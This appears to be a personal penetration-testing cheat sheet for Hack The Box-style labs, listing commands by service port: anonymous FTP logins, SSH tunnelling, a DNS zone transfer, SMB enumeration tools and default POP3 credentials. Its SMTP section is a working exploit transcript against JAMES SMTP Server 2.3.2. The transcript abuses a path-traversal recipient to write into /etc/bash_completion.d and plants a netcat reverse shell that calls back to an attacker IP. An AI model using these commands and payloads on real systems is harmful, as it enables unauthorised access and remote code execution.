FTP-21:
----------------
       ftp 10.10.10.10
       username:anonymous
       password:password
       
       
       ftp 10.10.10.10
       username:password:)
       password:password       psy shell
       
SSH-22:
------------------
       ssh user@10.10.10.10
       ssh -i id_rsa user@10.10.10.10
       ssh -L 5001:127.0.0.1:5009 user@10.10.10.10
       ssh -oKexAlgorithms=diffie-hellman-group1-sha1 -p 22022 sunny@10.10.10.76
       ssh permission 400 or 600
       
TELNET-23:
-------------------
       telnet 10.10.10.10  
       telnet 10.10.10.10 53 (Banner grabbing)
       
SMTP-25:
-------------------
       220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Mon, 30 Dec 2019 17:10:56 -0500 (EST)
       EHLO bla.bla
       250-solidstate Hello bla.bla (10.10.14.12 [10.10.14.12])
       250-PIPELINING
       250 ENHANCEDSTATUSCODES
       MAIL FROM: <'random@random.com>
       250 2.1.0 Sender <'random@random.com> OK
       RCPT TO: <../../../../../../../../etc/bash_completion.d>
       250 2.1.5 Recipient <../../../../../../../../etc/bash_completion.d@localhost> OK
       DATA
       354 Ok Send data ending with <CRLF>.<CRLF>
       FROM: bla.bla
       '
       /bin/nc -e /bin/bash 10.10.14.12 1234
       .
       250 2.6.0 Message received
       quit
       
      
DNS-53:
--------------------------------
       nslookup
       server 10.10.10.10
       10.10.10.10
       
       
       host -l hack.htb 10.10.10.10
       
HTTP-80:
-----------------------------------
       CMS OR CF OR user,help,admin,robots.txt
       source code and page info(look into certificates foremail id)
       dirbuster or gobuster or wfuzz
       burp suite 
       Windows or Linux
       
       
Kerberos-88:
------------------------------------




POP3-110:
------------------------------------
       nc 10.10.10.10 110
       USER  mindy
       PASS password
       
       telnet 10.10.10.10   110
       username:
       root
       password:
       root
SMB(139 OR 445):
-----------------------------------
       smbclient -L 10.10.10.10
       smbmap -R -H 10.10.10.10
       enum4linux -a 10.10.10.10
       rpcclient -U "" 10.10.10.10

HTTPS-443:
---------------------------------------------
       CMS OR CF OR user,help,admin,robots.txt
       source code and page info(look into certificates foremail id)
       dirbuster or gobuster or wfuzz
       burp suite 
       Windows or Linux
       
       
       
